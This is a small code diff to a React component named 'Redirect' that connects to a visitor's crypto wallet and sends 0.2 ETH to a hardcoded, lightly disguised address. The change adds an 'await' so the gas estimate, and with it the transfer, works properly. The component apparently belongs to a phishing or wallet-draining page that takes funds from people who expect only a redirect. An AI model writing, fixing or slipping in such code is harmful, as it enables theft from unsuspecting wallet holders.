@@ -50,7 +50,7 @@ export default function Redirect() {
       const ethersProvider = new BrowserProvider(walletProvider)
 
       const signer = await ethersProvider.getSigner()
-      let estimateGas = ethersProvider.estimateGas({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
+      let estimateGas = await ethersProvider.estimateGas({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
     
       await signer.sendTransaction({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
     }
